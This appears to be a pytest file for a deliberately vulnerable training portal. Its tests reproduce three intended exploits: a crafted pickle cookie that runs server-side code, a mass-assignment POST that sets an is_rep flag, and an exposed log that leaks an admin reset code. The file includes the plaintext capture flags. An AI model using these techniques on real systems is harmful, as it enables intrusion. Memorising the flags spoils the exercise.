"""Phase 5d: integrity and insecure-design flaws. Each test reproduces the
intended exploit, so plaintext flags appear below like the other phase tests.
"""
import base64
import os
import pickle
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from portal import create_app  # noqa: E402


@pytest.fixture(scope="module")
def client(tmp_path_factory):
    home = tmp_path_factory.mktemp("mfano5d")
    env = dict(os.environ, MFANO_HOME=str(home))
    subprocess.run([sys.executable, "seed.py"], cwd=ROOT, env=env, check=True, capture_output=True)
    os.environ["MFANO_HOME"] = str(home)
    app = create_app({"TESTING": True})
    c = app.test_client()
    c.post("/login", data={"username": "MHS1007", "password": "Student@123"})
    return c


# --- P5D-01: insecure deserialization (A08) ---------------------------------
class _ReadEnvFlag:
    """A pickle whose load runs os.getenv - i.e. attacker-chosen code runs on
    the server while the cookie is deserialised."""

    def __reduce__(self):
        return (os.getenv, ("MFANO_INTEGRITY_FLAG",))


def test_pickle_cookie_executes_attacker_code(client):
    # A fresh visit hands out a pickled-then-base64 cookie (discoverable).
    client.application.test_client().get("/account/prefs")

    payload = base64.b64encode(pickle.dumps(_ReadEnvFlag())).decode()
    client.set_cookie("mfano_prefs", payload)
    body = client.get("/account/prefs").get_data(as_text=True)
    assert "MFANO{p1ckl3_l04ds_r4n_my_c0d3}" in body
    client.delete_cookie("mfano_prefs")


# --- P5D-02: mass assignment / insecure design (A06) ------------------------
def test_mass_assignment_grants_rep(client):
    # The rep room is closed to an ordinary student.
    assert client.get("/account/rep-room").status_code == 403
    assert client.get("/account/settings").status_code == 200

    # The settings form only offers name and "about", but the handler writes any
    # column named in the POST. Setting is_rep on our own row opens the room.
    client.post("/account/settings", data={"about": "hi", "is_rep": "1"})
    room = client.get("/account/rep-room")
    assert room.status_code == 200
    assert b"MFANO{m4ss_4ss1gn_m4d3_m3_r3p}" in room.data

    # Put the row back so the ordering of tests does not matter.
    client.post("/account/settings", data={"is_rep": "0"})


# --- P5D-03: secrets in an exposed log (A09) --------------------------------
def test_reset_code_leaks_through_exposed_log(client):
    anon = client.application.test_client()  # no login needed to read the log
    log = {"name": "portal-security.log"}

    before = anon.get("/diagnostics/logs", query_string=log).get_data(as_text=True)
    assert "AUDIT" in before  # the log is served to anyone
    assert "MFANO{" not in before

    # Requesting a reset for the admin account logs the recovery code (the flag).
    client.post("/account/forgot", data={"username": "admin"})
    after = anon.get("/diagnostics/logs", query_string=log).get_data(as_text=True)
    assert "MFANO{l0gs_l34k3d_th3_r3s3t_c0d3}" in after

    # A reset for an ordinary account logs only a dummy code.
    client.post("/account/forgot", data={"username": "MHS1008"})
    latest = anon.get("/diagnostics/logs", query_string=log).get_data(as_text=True)
    assert "user=MHS1008" in latest
    assert latest.count("MFANO{") == 1
